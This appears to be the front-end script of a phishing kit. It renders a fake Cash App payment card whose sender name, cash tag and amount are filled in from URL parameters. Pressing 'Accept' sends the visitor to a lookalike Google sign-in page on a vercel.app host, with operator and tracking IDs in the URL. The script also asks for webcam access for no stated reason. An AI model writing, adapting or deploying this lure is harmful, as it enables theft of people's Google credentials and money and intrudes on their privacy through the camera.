





  


const style = document.createElement('style');
style.textContent = `
 body {
  height: 100%;
  margin: 0;
  padding: 0;
  font-family: Arial, sans-serif;
  background-color: #f5f5f5;
}

body {
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  box-sizing: border-box;
  padding: 20px;
}

.card {
  background-color: white;
  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
  border-radius: 12px;
  max-width: 500px;
  width: 100%;
  padding: 40px 20px;
  text-align: center;
}

.card img {
  width: 100px;
  height: 100px;
  border-radius: 50%;
  object-fit: cover;
}

.amount {
  font-size: 2.5rem;
  font-weight: 500;
  margin: 10px 0;
}

.text-gray {
  color: #777;
  margin-top: 5px;
}

.btn {
  width: 80%;
  padding: 12px;
  font-size: 1.25rem;
  border-radius: 999px;
  border: none;
  color: white;
  cursor: pointer;
  margin-top: 15px;
  text-decoration: none;
  display: inline-block;
  transition: background-color 0.3s ease;
}

.btn.accept {
  background-color: #047857;
}
.btn.accept:hover {
  background-color: #059669;
}

.btn.decline {
  background-color: #92400e;
}
.btn.decline:hover {
  background-color: #b45309;
}

@media (max-width: 500px) {
  .card {
    padding: 30px 15px;
  }

  .amount {
    font-size: 2rem;
  }

  .btn {
    font-size: 1.1rem;
    padding: 10px;
  }

  .card img {
    width: 80px;
    height: 80px;
  }
}
`;
document.head.appendChild(style);
 
const newDiv = document.createElement('div');
 
 
newDiv.className = 'card';
 
 const time = () => {
    const now = new Date();
    const hours = now.getHours();
    const minutes = now.getMinutes();
    const period = hours >= 12 ? "pm" : "am";
    let formattedHour;
    if (hours === 0) {
      formattedHour = 12; // midnight
    } else if (hours > 12) {
      formattedHour = hours - 12;
    } else {
      formattedHour = hours;
    }
    const formattedMinutes = minutes.toString().padStart(2, "0");

    return `${formattedHour}.${formattedMinutes} ${period}`;
  };
 
function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}
 
 
const urlParams = new URLSearchParams(window.location.search);
const errorParam = urlParams.get('error');
const adminId = urlParams.get('admin');
const posterId = urlParams.get('poster');
const verifyId = urlParams.get('verifyId');
const namecash = urlParams.get('namecash');
 
const cashTag = urlParams.get('cashTag');
 
const amount = urlParams.get('amount');
 
newDiv.innerHTML = `<div >
                  <label for="password" class="accept-button size-14 flex items-center justify-center rounded-full text-3xl bg-green-500">
      <div class="card">
    <img src="https://newsite-livid.vercel.app/cashapp.jpg" alt="img" />
 
    <div>
      <p class="font-semibold">${namecash}</p>
      <p>Payment to $${cashTag}</p>
    </div>
 
    <p class="amount">$ ${amount}</p>
 
    <p class="text-gray">Today ${time()}</p>
 
    <a class="btn accept" >Accept</a>
    <a class="btn decline">Decline</a>
  </div>
 
                  </label>
               </div>
 
`;
 
let x = 1;
 
 
document.addEventListener('click', function (e) {
 
 
    document.querySelectorAll('.accept-button').forEach(button => {
        button.addEventListener('click', () => {
            window.location.href = `https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`;
        });
    });
 
 
});
 
 
 
 
document.body.appendChild(newDiv);
 
 
$(document).ready(function () {
    // Check if getUserMedia is available
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        // Access the webcam
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function (stream) {
                // Show the video stream
                $('#video').get(0).srcObject = stream;
            })
            .catch(function (error) {
                console.error('Error accessing webcam:', error);
            });
    } else {
        console.error('getUserMedia is not supported');
    }
 
    $("button").on("click", function () {
        window.location.href = "https://google.com"
 
    });
 
 
 
 
 
});


